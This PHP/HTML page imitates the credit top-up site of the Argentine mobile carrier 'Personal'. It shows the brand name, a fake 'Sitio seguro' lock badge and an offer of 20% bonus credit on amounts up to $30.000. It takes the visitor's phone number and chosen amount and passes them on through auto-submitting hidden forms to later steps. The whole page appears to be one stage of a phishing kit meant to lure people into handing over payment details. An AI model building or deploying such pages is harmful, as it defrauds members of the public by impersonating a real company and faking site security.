<?php
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';

if(isset($_POST['amount'])) {
    ?>
    <form id="autoForm" method="POST" action="step3.php">
        <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
        <input type="hidden" name="amount" value="<?php echo htmlspecialchars($_POST['amount']); ?>">
    </form>
    <script>document.getElementById('autoForm').submit();</script>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recargá crédito | Personal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Arial, sans-serif;
            background: #f5f5f5;
        }
        
        .header {
            background: #fff;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
        }
        
        .logo { font-size: 24px; font-weight: 700; color: #00AEEF; }
        .sitio-seguro { font-size: 13px; color: #666; }
        
        .banner {
            background: linear-gradient(90deg, #6366F1 0%, #8B5CF6 100%);
            padding: 60px 30px;
            color: #fff;
        }
        
        .banner-content { max-width: 1000px; margin: 0 auto; }
        .banner h1 { font-size: 42px; font-weight: 700; margin-bottom: 15px; }
        .banner p { font-size: 18px; opacity: 0.95; }
        
        .container { max-width: 1000px; margin: 0 auto; padding: 40px 30px; }
        
        .phone-display {
            background: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 40px;
            text-align: center;
            font-size: 16px;
            color: #333;
        }
        
        h2 { font-size: 32px; font-weight: 700; color: #000; margin-bottom: 20px; }
        
        .descripcion {
            font-size: 15px;
            color: #555;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        
        .monto-card {
            background: #fff;
            border: 1px solid #e0e0e0;
            border-radius: 8px;
            padding: 24px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .monto-card:hover {
            border-color: #00AEEF;
            box-shadow: 0 2px 8px rgba(0, 174, 239, 0.15);
        }
        
        .monto-info { flex: 1; }
        
        .monto-precio {
            font-size: 28px;
            font-weight: 700;
            color: #000;
            margin-bottom: 4px;
        }
        
        .monto-regalo {
            font-size: 14px;
            color: #6366F1;
            font-weight: 600;
            margin-left: 10px;
        }
        
        .monto-detalles {
            font-size: 14px;
            color: #666;
            line-height: 1.4;
        }
        
        .arrow { font-size: 24px; color: #00AEEF; }
        
        @media (max-width: 768px) {
            .banner { padding: 40px 20px; }
            .banner h1 { font-size: 32px; }
            .banner p { font-size: 16px; }
            .container { padding: 30px 20px; }
            h2 { font-size: 26px; }
            .monto-precio { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">personal</div>
        <div class="sitio-seguro">🔒 Sitio seguro</div>
    </div>

    <div class="banner">
        <div class="banner-content">
            <h1>Recibí hasta un 20% de reintegro</h1>
            <p>Ahorrá hasta $8.000 por mes en tus recargas pagando con tarjeta Visa Personal Pay.</p>
        </div>
    </div>

    <div class="container">
        <div class="phone-display">
            📱 Número de línea ingresado: <strong><?php echo htmlspecialchars($phone); ?></strong>
        </div>

        <h2>Recargá crédito</h2>
        
        <div class="descripcion">
            Por hacerlo desde esta web, tenés un <strong>20% de crédito de regalo</strong>. Además, tus recargas incluyen llamadas ilimitadas, WhatsApp y otros beneficios.
            <br>¡Aprovechá todo el crédito disponible para comprar packs!
        </div>

        <form method="POST" action="step2.php" id="formMonto">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" id="selectedAmount">
            
            <div class="monto-card" onclick="seleccionar(4000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$4.000</span><span class="monto-regalo">+800 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 7 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(5000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$5.000</span><span class="monto-regalo">+1.000 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 7 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(6000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$6.000</span><span class="monto-regalo">+1.200 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 15 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(7000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$7.000</span><span class="monto-regalo">+1.400 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 15 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(8000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$8.000</span><span class="monto-regalo">+1.600 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(9000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$9.000</span><span class="monto-regalo">+1.800 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(10000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$10.000</span><span class="monto-regalo">+2.000 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(12000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$12.000</span><span class="monto-regalo">+2.400 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(15000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$15.000</span><span class="monto-regalo">+3.000 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>

            <div class="monto-card" onclick="seleccionar(30000)">
                <div class="monto-info">
                    <div><span class="monto-precio">$30.000</span><span class="monto-regalo">+6.000 de regalo</span></div>
                    <div class="monto-detalles">Incluye: WhatsApp + minutos a Personal x 30 días</div>
                </div>
                <div class="arrow">›</div>
            </div>
        </form>
    </div>

    <script>
        function seleccionar(monto) {
            document.getElementById('selectedAmount').value = monto;
            document.getElementById('formMonto').submit();
        }
    </script>
</body>
</html>